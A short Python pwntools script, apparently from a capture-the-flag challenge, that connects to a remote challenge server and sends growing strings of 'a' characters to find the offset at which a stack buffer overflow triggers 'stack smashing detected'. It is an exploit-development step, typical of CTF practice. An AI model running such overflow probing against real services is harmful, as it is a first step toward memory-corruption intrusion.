from pwn import *
import string
from tqdm import tqdm

host = args.HOST or 'cfta-bx01.allyourbases.co'
port = int(args.PORT or 8012)

for idx in range(300, 320):
    print("Trying %i" % idx)
    io = connect(host, port)
    io.sendlineafter("Exception: angle brackets not terminated.", "a"*idx)
    output = io.recvall()
    if b"stack smashing detected" in output:
        print("Offset: %i" % (idx - 1))
        break
    io.close()
